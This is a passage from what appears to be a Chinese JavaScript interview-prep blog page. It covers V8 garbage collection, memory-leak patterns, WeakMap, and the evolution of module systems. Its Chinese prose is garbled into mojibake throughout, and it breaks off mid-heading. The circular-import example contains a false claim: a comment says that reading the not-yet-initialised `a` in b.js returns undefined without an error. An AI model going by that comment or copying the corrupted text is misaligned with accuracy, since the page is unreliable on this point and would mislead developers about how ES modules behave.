å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶</h2><p><strong>åˆ†ä»£å¼åƒåœ¾å›æ”¶</strong></p><p>V8å°†å †å†…å­˜åˆ†ä¸ºä¸¤ä¸ªä¸»è¦åŒºåŸŸï¼š</p><p>æ–°ç”Ÿä»£ï¼š</p><ul><li>å­˜æ”¾ç”Ÿå­˜æ—¶é—´çŸ­çš„å¯¹è±¡</li><li>å®¹é‡å°ï¼ˆé€šå¸¸ 1ï½8MBï¼‰</li><li>å›æ”¶é¢‘ç¹</li><li>é‡‡ç”¨ Scavenge ç®—æ³•ï¼ˆä¸€ç§å¤åˆ¶ç®—æ³•ï¼‰</li></ul><p>è€ç”Ÿä»£ï¼š</p><ul><li>å­˜æ”¾ç”Ÿå­˜æ—¶é—´é•¿çš„å¯¹è±¡</li><li>å®¹é‡å¤§</li><li>å›æ”¶é¢‘ç‡è¾ƒä½</li><li>é‡‡ç”¨ æ ‡è®°-æ¸…é™¤ å’Œ æ ‡è®°-å‹ç¼© ç®—æ³•</li></ul><p><strong>å›æ”¶è¿‡ç¨‹è¯¦è§£</strong></p><p>æ–°ç”Ÿä»£å›æ”¶è¿‡ç¨‹ï¼š</p><ul><li>å°†æ–°ç”Ÿä»£åŒºåŸŸåˆ†æˆä¸¤ä¸ªç©ºé—´ï¼šFrom å’Œ To</li><li>å°†å¯¹è±¡åˆ†é…åˆ° From ç©ºé—´</li><li>å½“ From ç©ºé—´æ»¡æ—¶ï¼Œæ ‡è®° From ç©ºé—´å†…çš„æ´»è·ƒå¯¹è±¡ï¼Œå¹¶å°†æ´»è·ƒå¯¹è±¡å¤åˆ¶åˆ° To ç©ºé—´ï¼Œæ‰§è¡Œåƒåœ¾å›æ”¶æ¸…ç©º From ç©ºé—´ï¼ŒåŒæ—¶äº¤æ¢ From ç©ºé—´å’Œ To ç©ºé—´</li><li>å¯¹è±¡ç»å†å¤šæ¬¡å›æ”¶æ™‹å‡ä¸ºè€ç”Ÿä»£</li></ul><p>è€ç”Ÿä»£å›æ”¶è¿‡ç¨‹ï¼š</p><ul><li>æ ‡è®°é˜¶æ®µï¼šä»æ ¹å¯¹è±¡å‡ºå‘ï¼Œé‡‡ç”¨ä¸‰è‰²æ ‡è®°æ³•ï¼ˆç™½ã€ç°ã€é»‘ï¼‰æ ‡è®°å¯è¾¾å¯¹è±¡</li><li>æ¸…é™¤&#x2F;å‹ç¼©é˜¶æ®µï¼šæ¸…é™¤æœªæ ‡è®°å¯¹è±¡æˆ–å‹ç¼©å†…å­˜æ¶ˆé™¤ç¢ç‰‡</li></ul><p><strong>å¢é‡æ ‡è®°ä¸æƒ°æ€§æ¸…ç†</strong></p><ul><li>å¢é‡æ ‡è®°ï¼šå°†æ ‡è®°è¿‡ç¨‹æ‹†åˆ†ä¸ºå¤šä¸ªå°ä»»åŠ¡ï¼Œä¸ JavaScript æ‰§è¡Œäº¤æ›¿è¿›è¡Œï¼Œé¿å…é•¿æ—¶é—´é˜»å¡ä¸»çº¿ç¨‹</li><li>æƒ°æ€§æ¸…ç†ï¼šå»¶è¿Ÿæ¸…ç†è¿‡ç¨‹ï¼ŒæŒ‰éœ€æ¸…ç†å†…å­˜ï¼Œè¿›ä¸€æ­¥å‡å°‘å¯¹ä¸»çº¿ç¨‹çš„å½±å“</li></ul><h2 id="å†…å­˜æ³„éœ²ä¸æ’æŸ¥"><a href="#å†…å­˜æ³„éœ²ä¸æ’æŸ¥" class="headerlink" title="å†…å­˜æ³„éœ²ä¸æ’æŸ¥"></a>å†…å­˜æ³„éœ²ä¸æ’æŸ¥</h2><p><strong>å¸¸è§çš„å†…å­˜æ³„éœ²åœºæ™¯</strong></p><p>ï¼ˆ1ï¼‰æ„å¤–çš„å…¨å±€å˜é‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params"></span>) &#123;<br>  leakedVar = <span class="hljs-string">&#x27;æ„å¤–å…¨å±€&#x27;</span>; <span class="hljs-comment">// æœªä½¿ç”¨var/let/const</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">leakedProp</span> = <span class="hljs-string">&#x27;æ„å¤–ç»‘å®šåˆ°å…¨å±€&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰é—å¿˜çš„å®šæ—¶å™¨æˆ–å›è°ƒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">fetchData</span>();<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">process</span>(data); <span class="hljs-comment">// dataä¸€ç›´è¢«å¼•ç”¨</span><br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰DOM å¼•ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> elements = &#123;<br>  <span class="hljs-attr">button</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>)<br>&#125;;<br><br><span class="hljs-comment">// å³ä½¿ä»DOMç§»é™¤ï¼Œelements.buttonä»ä¿ç•™å¼•ç”¨ï¼Œéœ€è¦ç½®ç©º button æ‰èƒ½è§£å†³</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>));<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰é—­åŒ…æ»¥ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createClosure</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> largeObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// å³ä½¿ä¸ä½¿ç”¨largeObjï¼Œå®ƒä»è¢«ä¿ç•™</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closure&#x27;</span>);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å†…å­˜æ’æŸ¥å·¥å…·</strong></p><p>Chrome DevToolsï¼š</p><ul><li>Performance é¢æ¿ï¼šè®°å½•å†…å­˜å˜åŒ–</li><li>Memory é¢æ¿ï¼š<ul><li>Heap Snapshotï¼šå †å†…å­˜å¿«ç…§</li><li>Allocations On Timelineï¼šå†…å­˜åˆ†é…æ—¶é—´çº¿</li><li>Allocation Samplingï¼šå†…å­˜åˆ†é…é‡‡æ ·</li></ul></li></ul><p>Node.js å·¥å…·ï¼š</p><ul><li>process.memoryUsage()</li><li>â€“inspect æ ‡è¯†å¯ç”¨è°ƒè¯•</li><li>heapdump æ¨¡å—ç”Ÿæˆå †å¿«ç…§</li></ul><h2 id="æ€§èƒ½ä¼˜åŒ–å®è·µ"><a href="#æ€§èƒ½ä¼˜åŒ–å®è·µ" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–å®è·µ"></a>æ€§èƒ½ä¼˜åŒ–å®è·µ</h2><p><strong>ç¼–ç¨‹æœ€ä½³å®è·µ</strong></p><p>ï¼ˆ1ï¼‰é¿å…æ„å¤–å…¨å±€å˜é‡<br>ï¼ˆ2ï¼‰è°¨æ…ä½¿ç”¨é—­åŒ…<br>ï¼ˆ3ï¼‰åŠæ—¶æ¸…é™¤å®šæ—¶å™¨å’Œäº‹ä»¶ç›‘å¬å™¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">clearTimeout</span>(timer);<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰é¿å…å†…å­˜å¯†é›†æ“ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸ä½³ï¼šé¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// è¾ƒä½³ï¼šå¤ç”¨å¯¹è±¡</span><br><span class="hljs-keyword">const</span> dataPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// å¤ç”¨dataPool</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¯¹è±¡æ± æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectPool</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">createFn</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createFn</span> = createFn;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span> = [];<br>  &#125;<br>  <br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-property">length</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">pop</span>() : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createFn</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">release</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">push</span>(obj);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectPool</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>));<br><span class="hljs-keyword">const</span> arr = pool.<span class="hljs-title function_">get</span>();<br><span class="hljs-comment">// ä½¿ç”¨åé‡Šæ”¾</span><br>pool.<span class="hljs-title function_">release</span>(arr);<br></code></pre></td></tr></table></figure><p><strong>WeakMap å’Œ WeakSet</strong></p><p>WeakMap å’Œ WeakSet çš„é”®æ˜¯å¼±å¼•ç”¨ï¼Œä¸ä¼šé˜»æ­¢ GC åƒåœ¾å›æ”¶é”®å¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> weakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br>weakMap.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;some data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>; <span class="hljs-comment">// ç°åœ¨weakMapä¸­çš„æ¡ç›®å¯ä»¥è¢«åƒåœ¾å›æ”¶</span><br></code></pre></td></tr></table></figure><h2 id="é¢è¯•å¸¸è§é—®é¢˜-5"><a href="#é¢è¯•å¸¸è§é—®é¢˜-5" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šJavaScript æ˜¯å¦‚ä½•ç®¡ç†å†…å­˜çš„ï¼Ÿ</strong></p><p>JavaScript ä½¿ç”¨è‡ªåŠ¨åƒåœ¾å›æ”¶æœºåˆ¶ã€‚ä¸»è¦é‡‡ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ŒV8å¼•æ“é‡‡ç”¨åˆ†ä»£å›æ”¶ç­–ç•¥ï¼Œå°†å †å†…å­˜åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ä¸¤ä¸ªåŒºåŸŸï¼Œåˆ†åˆ«é‡‡ç”¨ Scavenge ç®—æ³•å’Œæ ‡è®°-æ¸…é™¤&#x2F;å‹ç¼©ç®—æ³•</p><p><strong>Qï¼šä»€ä¹ˆæ˜¯å†…å­˜æ³„éœ²ï¼Ÿå¦‚ä½•é¿å…ï¼Ÿ</strong></p><p>å†…å­˜æ³„éœ²æ˜¯æŒ‡ä¸å†è¢«éœ€è¦çš„å†…å­˜æœªèƒ½æ­£ç¡®é‡Šæ”¾ã€‚å¸¸è§çš„å†…å­˜æ³„éœ²åœºæ™¯æœ‰ï¼šæ„å¤–çš„å…¨å±€å˜é‡ã€æ¸¸ç¦»çš„ DOMã€é—­åŒ…æ»¥ç”¨ã€æœªåŠæ—¶æ¸…é™¤çš„å®šæ—¶å™¨&#x2F;äº‹ä»¶ç›‘å¬ç­‰ï¼Œå¯ä»¥é€šè¿‡å¼±å¼•ç”¨ã€å¯¹è±¡æ± ã€ä¸¥æ ¼æ¨¡å¼ã€åŠæ—¶æ¸…ç†å®šæ—¶å™¨ç­‰æ–¹æ³•é¿å…</p><p><strong>Qï¼šWeakMap å’Œ Map æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><p>WeakMap çš„é”®å¿…é¡»æ˜¯å¯¹è±¡ï¼Œä¸”æ˜¯å¼±å¼•ç”¨ï¼Œä¸ä¼šé˜»æ­¢ GC åƒåœ¾å›æ”¶å™¨å›æ”¶é”®å¯¹è±¡ï¼›Map çš„é”®å¯ä»¥æ˜¯ä»»æ„ç±»å‹ï¼Œä¸”ä¿æŒå¯¹é”®çš„å¼ºå¼•ç”¨</p><p><strong>Qï¼šè§£é‡Šä¸‹ V8 å¼•æ“çš„å›æ”¶ç­–ç•¥ï¼Ÿ</strong></p><p>V8 å¼•æ“é‡‡ç”¨åˆ†ä»£å›æ”¶ç­–ç•¥ï¼Œå°†å †å†…å­˜åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ä¸¤ä¸ªåŒºåŸŸã€‚æ–°ç”Ÿä»£åŒºåŸŸå­˜æ”¾å°å¯¹è±¡ã€ç”Ÿå­˜æ—¶é—´çŸ­çš„å¯¹è±¡ï¼Œè€ç”Ÿä»£åŒºåŸŸå­˜æ”¾å¤§å¯¹è±¡ã€ç”Ÿå­˜æ—¶é—´é•¿çš„å¯¹è±¡ã€‚æ–°ç”Ÿä»£é‡‡ç”¨ Scavenge ç®—æ³•å›æ”¶ï¼Œè€ç”Ÿä»£é‡‡ç”¨æ ‡è®°-æ¸…é™¤&#x2F;å‹ç¼©ç®—æ³•å›æ”¶ï¼Œé‡‡ç”¨å¢é‡æ ‡è®°å’Œæƒ°æ€§æ¸…ç†ç­–ç•¥ï¼Œå‡å°‘å¯¹ä¸»çº¿ç¨‹çš„å½±å“</p><h1 id="JavaScriptæ¨¡å—åŒ–æœºåˆ¶"><a href="#JavaScriptæ¨¡å—åŒ–æœºåˆ¶" class="headerlink" title="JavaScriptæ¨¡å—åŒ–æœºåˆ¶"></a>JavaScriptæ¨¡å—åŒ–æœºåˆ¶</h1><h2 id="æ¨¡å—åŒ–æ¼”è¿›å²ï¼šä»æ··ä¹±åˆ°æ ‡å‡†åŒ–"><a href="#æ¨¡å—åŒ–æ¼”è¿›å²ï¼šä»æ··ä¹±åˆ°æ ‡å‡†åŒ–" class="headerlink" title="æ¨¡å—åŒ–æ¼”è¿›å²ï¼šä»æ··ä¹±åˆ°æ ‡å‡†åŒ–"></a>æ¨¡å—åŒ–æ¼”è¿›å²ï¼šä»æ··ä¹±åˆ°æ ‡å‡†åŒ–</h2><p><strong>åŸå§‹é˜¶æ®µï¼šå…¨å±€å‘½åç©ºé—´æ±¡æŸ“</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b, c</span>) &#123; <span class="hljs-keyword">return</span> a + b + c; &#125; <span class="hljs-comment">// å‘½åå†²çª</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 3 or 6? ç»“æœä¸å¯é¢„æµ‹</span><br></code></pre></td></tr></table></figure><p><strong>IIFE æ¨¡å¼ï¼šåˆæ­¥å°è£…</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç«‹å³æ‰§è¡Œå‡½æ•°éš”ç¦»ä½œç”¨åŸŸ</span><br><span class="hljs-keyword">var</span> calculator = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">add</span>: add<br>  &#125;;<br>&#125;)();<br><br><span class="hljs-comment">// ä½¿ç”¨æ¨¡å—</span><br>calculator.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p><strong>CommonJSï¼šNode.js çš„æ¨¡å—æ ‡å‡†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-built_in">exports</span>.<span class="hljs-property">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><p><strong>AMDï¼šæµè§ˆå™¨å¼‚æ­¥åŠ è½½æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨RequireJS</span><br><span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep1&#x27;</span>, <span class="hljs-string">&#x27;dep2&#x27;</span>], <span class="hljs-keyword">function</span>(<span class="hljs-params">dep1, dep2</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">calculate</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> dep1.<span class="hljs-property">value</span> + dep2.<span class="hljs-property">value</span>;<br>    &#125;<br>  &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>UMDï¼šé€šç”¨æ¨¡å—å®šä¹‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å…¼å®¹CommonJSå’ŒAMD</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">root, factory</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> define === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="hljs-property">amd</span>) &#123;<br>    <span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep&#x27;</span>], factory);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">exports</span> === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">factory</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dep&#x27;</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    root.<span class="hljs-property">myModule</span> = <span class="hljs-title function_">factory</span>(root.<span class="hljs-property">dep</span>);<br>  &#125;<br>&#125;(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">dep</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-comment">/* æ¨¡å—å†…å®¹ */</span> &#125;;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>ES Modulesï¼šç°ä»£ JavaScript æ¨¡å—æ ‡å‡†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; add, <span class="hljs-variable constant_">PI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-variable constant_">PI</span>, <span class="hljs-variable constant_">PI</span>)); <span class="hljs-comment">// 6.28318</span><br></code></pre></td></tr></table></figure><h2 id="ES-Modules-æ ¸å¿ƒæœºåˆ¶æ·±åº¦å‰–æ"><a href="#ES-Modules-æ ¸å¿ƒæœºåˆ¶æ·±åº¦å‰–æ" class="headerlink" title="ES Modules æ ¸å¿ƒæœºåˆ¶æ·±åº¦å‰–æ"></a>ES Modules æ ¸å¿ƒæœºåˆ¶æ·±åº¦å‰–æ</h2><p><strong>æ¨¡å—åŠ è½½ä¸‰é˜¶æ®µ</strong></p><pre class="mermaid">graph TD    A[æ„å»º Construction] --> B[è§£ææ¨¡å—]    B --> C[å»ºç«‹ä¾èµ–å›¾]    C --> D[å®ä¾‹åŒ– Instantiation]    D --> E[åˆ†é…å†…å­˜]    E --> F[å»ºç«‹å¯¼å…¥/å¯¼å‡ºé“¾æ¥]    F --> G[æ±‚å€¼ Evaluation]    G --> H[æ‰§è¡Œé¡¶å±‚ä»£ç ]</pre><p><strong>å®æ—¶ç»‘å®šåŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// counter.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123; count++; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; count, increment &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./counter.js&#x27;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 0</span><br><span class="hljs-title function_">increment</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 1 (å€¼å®æ—¶æ›´æ–°)</span><br></code></pre></td></tr></table></figure><p><strong>å¾ªç¯å¼•ç”¨è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">import</span> &#123; b &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;aä¸­è·å–b:&#x27;</span>, b); <span class="hljs-comment">// &#x27;B&#x27;</span><br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; a &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bä¸­è·å–a:&#x27;</span>, a); <span class="hljs-comment">// undefined (ä½†ä¸ä¼šæŠ¥é”™)</span><br><br><span class="hljs-comment">// ES Modules å¤„ç†å¾ªç¯å¼•ç”¨çš„å…³é”®ï¼š</span><br><span class="hljs-comment">// 1. æ„å»ºé˜¶æ®µå»ºç«‹æ‰€æœ‰å¯¼å‡ºç»‘å®š</span><br><span class="hljs-comment">// 2. æ‰§è¡Œé˜¶æ®µæŒ‰é¡ºåºæ±‚å€¼</span><br><span class="hljs-comment">// 3. æœªåˆå§‹åŒ–å˜é‡å€¼ä¸ºundefined</span><br></code></pre></td></tr></table></figure><h2 id="ç°ä»£æ¨¡å—ç³»ç»Ÿæ ¸å¿ƒç‰¹æ€§å¯¹æ¯”"><a href="#ç°ä»£æ¨¡å—ç³»ç»Ÿæ 